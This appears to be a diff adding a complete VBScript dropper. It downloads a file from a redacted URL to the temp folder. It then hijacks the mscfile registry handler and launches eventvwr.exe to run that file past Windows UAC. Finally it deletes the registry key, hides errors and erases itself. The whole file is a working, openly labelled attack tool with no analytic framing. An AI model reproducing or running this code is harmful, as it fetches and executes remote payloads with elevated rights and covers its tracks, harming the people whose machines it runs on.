@@ -1,0 +1,115 @@
+Sub Main()
+
+'Setting some vars
+
+fileurl = "[URL]"
+
+filename = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "/[NAME]"
+
+
+
+'Download function
+
+dim shellobj 
+
+set shellobj = wscript.createobject("wscript.shell")
+
+set objhttpdownload = createobject("msxml2.xmlhttp" )
+
+objhttpdownload.open "get", fileurl, false
+
+objhttpdownload.send
+
+set objfsodownload = createobject ("scripting.filesystemobject")
+
+if  objfsodownload.fileexists (filename) then
+
+    objfsodownload.deletefile (filename)
+
+end if
+
+ if objhttpdownload.status = 200 then
+
+   dim  objstreamdownload
+
+   set  objstreamdownload = createobject("adodb.stream")
+
+   with objstreamdownload
+
+        .type = 1 
+
+        .open
+
+        .write objhttpdownload.responsebody
+
+        .savetofile filename
+
+        .close
+
+   end with
+
+   set objstreamdownload = nothing
+
+end if
+
+
+
+'UAC bypass/exploit setup
+
+Set WshShell = CreateObject("WScript.Shell")
+
+myKey = "HKCU\Software\Classes\mscfile\shell\open\command\"
+
+WshShell.RegWrite myKey,filename ,"REG_SZ"
+
+
+
+'UAC bypass/exploit trigger
+
+CreateObject("WScript.Shell").Run "eventvwr.exe"
+
+
+
+WScript.Sleep 1000
+
+
+
+'UAC bypass/exploit cleanup
+
+Set objShell = Wscript.CreateObject("Wscript.Shell")
+
+objShell.RegDelete "HKCU\Software\Classes\mscfile\shell\open\command\"
+
+
+
+
+
+'Cleanup removal of this script after completed
+
+Set Cleanup = WScript.CreateObject("WScript.Shell")
+
+Cleanup.Run "cmd /c del %temp%\run.vbs", 0, True
+
+
+
+End Sub 
+
+
+
+'We dont want to display any errors
+
+On Error Resume Next
+
+  Main
+
+  If Err.Number Then
+
+     'on error cleanup and exit
+
+     set Cleanup = WScript.CreateObject("WScript.Shell")
+
+     Cleanup.Run "cmd /c del %temp%\run.vbs", 0, True
+
+     WScript.Quit 4711
+
+End If
